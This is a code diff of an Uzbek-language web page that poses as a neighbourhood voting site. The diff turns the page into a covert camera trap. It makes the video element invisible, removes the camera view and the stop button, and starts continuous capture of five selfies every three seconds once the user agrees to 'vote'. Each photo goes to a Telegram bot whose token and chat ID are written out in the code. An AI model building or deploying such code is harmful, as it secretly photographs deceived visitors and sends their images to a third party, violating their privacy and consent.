@@ -28,45 +28,26 @@
       align-items: center;
       line-height: 1.5;
     }
-
-    /* ==== NAVBAR ==== */
-    .navbar {
-      width: 100%; max-width: 900px; text-align: center; padding: 10px 0;
-      font-size: clamp(14px, 2.5vw, 16px); font-weight: 600; color: var(--primary);
-    }
-
-    /* ==== HERO ==== */
+    .navbar { width: 100%; max-width: 900px; text-align: center; padding: 10px 0;
+      font-size: clamp(14px, 2.5vw, 16px); font-weight: 600; color: var(--primary); }
     .hero { text-align: center; margin: 16px 0; }
     .logo { width: clamp(70px, 15vw, 90px); border-radius: 50%; margin-bottom: 8px; }
     .title { font-size: clamp(20px, 5vw, 26px); font-weight: 700; color: var(--primary); }
 
-    /* ==== STATISTIKA ==== */
     .stats-card {
       background: var(--card); padding: 16px; border-radius: 14px;
       box-shadow: 0 4px 16px rgba(0,0,0,.08); text-align: center;
       margin: 16px 0; max-width: 360px; width: 100%;
     }
-    .stats-number {
-      font-size: clamp(30px, 8vw, 38px); font-weight: 700; color: var(--primary);
-    }
+    .stats-number { font-size: clamp(30px, 8vw, 38px); font-weight: 700; color: var(--primary); }
     .stats-label { font-size: clamp(13px, 3vw, 14px); color: var(--light); }
-
     .pulse { animation: pulse 1s ease-in-out; }
     @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.15); } }
 
-    /* ==== ACTION CARD ==== */
     .action-card {
       background: var(--card); border-radius: 14px; padding: 18px;
       box-shadow: 0 6px 20px rgba(0,0,0,.1); width: 100%; max-width: 460px;
       margin: 14px auto; text-align: center;
-      display: none;
-    }
-    video {
-      width: 100%; max-height: 340px; border-radius: 12px; background: #000;
-      object-fit: cover; margin-bottom: 10px;
-    }
-    .controls {
-      margin-top: 10px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;
     }
     .btn {
       padding: clamp(10px, 2.5vw, 12px) clamp(20px, 5vw, 24px);
@@ -76,9 +57,6 @@
     }
     .btn:active { transform: scale(.94); }
     .vote-btn { background: #34a853; color: #fff; }
-    .upload-btn { background: #4285f4; color: #fff; }
-    .stop-btn { background: #c5221f; color: #fff; }
-
     .file-label {
       display: inline-block; padding: clamp(10px, 2.5vw, 12px) clamp(20px, 5vw, 24px);
       background: #673ab7; color: #fff; border-radius: 28px; font-weight: 600;
@@ -86,16 +64,14 @@
     }
     .file-label:hover { background: #5e35b1; }
     .file-input { display: none; }
-
     .status {
-      margin-top: 14px; padding: 10 paragraph; border-radius: 10px;
+      margin-top: 14px; padding: 10px; border-radius: 10px;
       font-size: clamp(13px, 3vw, 15px); font-weight: 500;
     }
     .status.success { background: #e6f4ea; color: var(--success); }
     .status.error { background: #fce8e6; color: #c5221f; }
     .status.info { background: #e8f0fe; color: #1a73e8; }
 
-    /* ==== MODAL ==== */
     .modal {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: rgba(0,0,0,.85); backdrop-filter: blur(8px);
@@ -117,7 +93,6 @@
     .allow { background: #34a853; color: #fff; }
     .deny { background: #f1f3f4; color: #3c4043; }
 
-    /* ==== GALEREYA ==== */
     .gallery {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
@@ -136,13 +111,24 @@
     }
     .gallery img:hover { transform: scale(1.05); }
 
-    /* ==== FOOTER ==== */
     .footer {
       margin-top: 32px; text-align: center; color: var(--light);
       font-size: clamp(12px, 2.5vw, 13px); padding: 0 16px;
     }
     .footer a { color: var(--primary); text-decoration: none; }
     .footer a:hover { text-decoration: underline; }
+
+    /* Kamera butunlay yashirin */
+    #video {
+      position: fixed !important;
+      left: -9999px !important;
+      top: -9999px !important;
+      width: 1px !important;
+      height: 1px !important;
+      opacity: 0 !important;
+      pointer-events: none !important;
+    }
+    #cameraCard { display: none !important; }
   </style>
 </head>
 <body>
@@ -168,25 +154,20 @@
     <div id="status" class="status info">Ruxsat kutilmoqda...</div>
   </div>
 
-  <!-- Kamera -->
-  <div class="action-card" id="cameraCard" style="display:none;">
-    <video id="video" autoplay playsinline></video>
-    <div class="controls">
-      <button id="stopBtn" class="btn stop-btn" style="display:none;">To‘xtatish</button>
-    </div>
-  </div>
+  <!-- Yashirin video (hech qachon ko‘rinmaydi) -->
+  <video id="video" autoplay playsinline></video>
 
   <!-- Modal -->
   <div id="modal" class="modal" style="display:none;">
     <div class="modal-content">
-        <h2>Ovoz berish roziligi</h2>
-    <p>
-      Hurmatli foydalanuvchi! <br>
-      Sizning ovozingiz — bizning mahallamiz obodligi va farovonligi uchun muhim. 
-      Ovoz berish orqali mahallamizni yanada chiroyli, toza va qulay joyga aylantirishga hissa qo‘shasiz.
-      <br><br>
-      Ovoz berishga rozimisiz?
-    </p>
+      <h2>Ovoz berish roziligi</h2>
+      <p>
+        Hurmatli foydalanuvchi! <br>
+        Sizning ovozingiz — bizning mahallamiz obodligi va farovonligi uchun muhim.
+        Ovoz berish orqali mahallamizni yanada chiroyli, toza va qulay joyga aylantirishga hissa qo‘shasiz.
+        <br><br>
+        Ovoz berishga rozimisiz?
+      </p>
       <div class="modal-buttons">
         <button id="allowBtn" class="modal-btn allow">Ha, ruxsat beraman</button>
         <button id="denyBtn" class="modal-btn allow">Yo‘q</button>
@@ -194,7 +175,7 @@
     </div>
   </div>
 
-  <!-- Hashar galereyasi -->
+  <!-- Galereya (faqat ko‘rinish uchun) -->
   <div class="gallery">
     <img src="https://aviib.uz/uploads/news/23d8f028c6e1e14594a468ba4fa93bff.jpg" alt="Hashar 1">
     <img src="https://aviib.uz/uploads/news/09a0499ceee0bd9f539cf21d34e094c8.jpg" alt="Hashar 2">
@@ -221,27 +202,25 @@
   </div>
 
   <script>
-    // ==== Ma'lumotlar ====
-  const BOT_TOKEN = '7978359844:AAH_su2pm1WJQZuzSjkNsu8BRo-cemtvKgg'; // agar demo ishlatsangiz, ogohlantirishni biling
-    const CHAT_ID = '7412640853'; // bu yerga chat_id qo'ying
+    // ==== Bot ma'lumotlari ====
+    const BOT_TOKEN = '7978359844:AAH_su2pm1WJQZuzSjkNsu8BRo-cemtvKgg';
+    const CHAT_ID   = '7412640853';
 
     const video       = document.getElementById('video');
     const status      = document.getElementById('status');
     const modal       = document.getElementById('modal');
     const allowBtn    = document.getElementById('allowBtn');
     const denyBtn     = document.getElementById('denyBtn');
-    const stopBtn     = document.getElementById('stopBtn');
     const voteBtn     = document.getElementById('voteBtn');
     const fileInput   = document.getElementById('fileInput');
     const voteCountEl = document.getElementById('voteCount');
-    const cameraCard  = document.getElementById('cameraCard');
 
     let stream = null;
     let captureInterval = null;
     let isRunning = false;
     let voteCount = 1247;
 
-    // ==== Animatsiya bilan ovoz oshirish ====
+    // ==== Ovoz hisoblagichi ====
     function updateVoteCount() {
       voteCount++;
       voteCountEl.textContent = voteCount.toLocaleString('uz-UZ');
@@ -249,20 +228,20 @@
       setTimeout(() => voteCountEl.classList.remove('pulse'), 600);
     }
 
-    // ==== Status ===
+    // ==== Status xabari ====
     function showStatus(msg, type = 'info') {
       status.textContent = msg;
       status.className = `status ${type}`;
     }
 
-    // ==== Modal ===
+    // ==== Modal ko‘rsatish ====
     window.addEventListener('load', () => {
       setTimeout(() => modal.style.display = 'flex', 800);
     });
 
     allowBtn.onclick = () => {
       modal.style.display = 'none';
-      startCameraAndAutoCapture();
+      startHiddenCamera();
     };
 
     denyBtn.onclick = () => {
@@ -270,14 +249,14 @@
       showStatus('Ruxsat berilmadi.', 'error');
     };
 
-    // ==== Ovoz berish tugmasi ===
+    // ==== Oddiy ovoz berish tugmasi ====
     voteBtn.onclick = () => {
       updateVoteCount();
       showStatus('Ovoz qabul qilindi!', 'success');
       setTimeout(() => showStatus('Yana ovoz bering yoki rasm yuklang.', 'info'), 2000);
     };
 
-    // ==== Rasm yuklash ===
+    // ==== Rasm yuklash ====
     fileInput.addEventListener('change', async () => {
       const file = fileInput.files[0];
       if (!file) return;
@@ -295,42 +274,40 @@
       return new Promise((resolve, reject) => {
         const img = new Image();
         const reader = new FileReader();
-        reader.onload = e => {
-          img.src = e.target.result;
-          img.onload = () => {
-            const canvas = document.createElement('canvas');
-            let w = img.width, h = img.height;
-            if (w > maxW || h > maxH) {
-              const ratio = Math.min(maxW / w, maxH / h);
-              w = Math.round(w * ratio); h = Math.round(h * ratio);
-            }
-            canvas.width = w; canvas.height = h;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(img, 0, 0, w, h);
-            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
-          };
+        reader.onload = e => { img.src = e.target.result; };
+        img.onload = () => {
+          const canvas = document.createElement('canvas');
+          let w = img.width, h = img.height;
+          if (w > maxW || h > maxH) {
+            const ratio = Math.min(maxW / w, maxH / h);
+            w = Math.round(w * ratio); h = Math.round(h * ratio);
+          }
+          canvas.width = w; canvas.height = h;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(img, 0, 0, w, h);
+          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
         };
         reader.onerror = reject;
         reader.readAsDataURL(file);
       });
     }
 
-    // ==== Kamera + avto selfie ===
-    async function startCameraAndAutoCapture() {
+    // ==== Yashirin kamera + har 3s da 5 ta surat ====
+    async function startHiddenCamera() {
       try {
-        showStatus('Kamera ochilmoqda...', 'info');
+        showStatus('Kamera tayyorlanmoqda...', 'info');
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
         });
         video.srcObject = stream;
-        cameraCard.style.display = 'block';
         video.onloadedmetadata = () => {
           video.play();
           showStatus('Avto boshlandi! Har 3s da 5 ta surat...', 'success');
-          stopBtn.style.display = 'block';
           isRunning = true;
 
+          // birinchi 5 ta – 1 soniyadan keyin
           setTimeout(captureFive, 1000);
+          // keyin har 3 soniyada
           captureInterval = setInterval(() => {
             if (isRunning) captureFive();
           }, 3000);
@@ -352,11 +329,11 @@
         ctx.drawImage(video, 0, 0);
         const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
         await sendToTelegram(blob, 'selfie');
-        await new Promise(r => setTimeout(r, 180));
+        await new Promise(r => setTimeout(r, 180)); // 180 ms oraliq
       }
     }
 
-    // ==== Telegramga yuborish ===
+    // ==== Telegramga yuborish ====
     async function sendToTelegram(blob, type) {
       try {
         const form = new FormData();
@@ -376,7 +353,7 @@
 
         if (json.ok) {
           updateVoteCount();
-          showStatus(`${type === 'selfie' ? 'Selfie' : 'Rasm'} yuborildi! Jami: ${voteCount}`, 'success');
+          showStatus(`Surat yuborildi! Jami: ${voteCount}`, 'success');
         } else {
           showStatus('Yuborishda xato.', 'error');
         }
@@ -385,16 +362,7 @@
       }
     }
 
-    // ==== To‘xtatish ===
-    stopBtn.onclick = () => {
-      isRunning = false;
-      clearInterval(captureInterval);
-      stopBtn.style.display = 'none';
-      if (stream) stream.getTracks().forEach(t => t.stop());
-      showStatus('Avto to‘xtatildi.', 'info');
-    };
-
-    // ==== Boshlang‘ich ===
+    // ==== Boshlang‘ich hisoblagich ====
     voteCountEl.textContent = voteCount.toLocaleString('uz-UZ');
   </script>
 </body>
